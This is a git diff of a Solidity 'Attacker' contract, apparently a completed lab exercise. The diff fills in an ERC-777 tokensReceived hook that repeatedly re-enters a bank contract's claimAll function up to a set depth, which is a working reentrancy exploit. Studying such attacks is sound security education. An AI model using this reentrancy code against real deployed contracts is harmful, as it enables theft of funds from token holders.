@@ -67,20 +67,19 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata userData,
 		bytes calldata operatorData
 	) external {
-		//YOUR CODE TO RECURSE GOES HERE
-		// Ensure the tokens received are from the bank's token
-    if (msg.sender != address(bank.token())) {
-        return;
+        // Ensure the tokens received are from the bank's token
+        if (msg.sender != address(bank.token())) {
+            return;
+        }
+
+        // Recurse if we haven't reached the maximum depth
+        if (depth < max_depth) {
+            depth++;
+            emit Recurse(depth);
+
+            // Re-enter the bank's claimAll function
+            bank.claimAll();
+        }
     }
-
-    // Recurse if we haven't reached the maximum depth
-    if (depth < max_depth) {
-        depth++;
-        emit Recurse(depth);
-
-        // Re-enter the bank's claimAll function
-        bank.claimAll();
-    }
-
 }
 
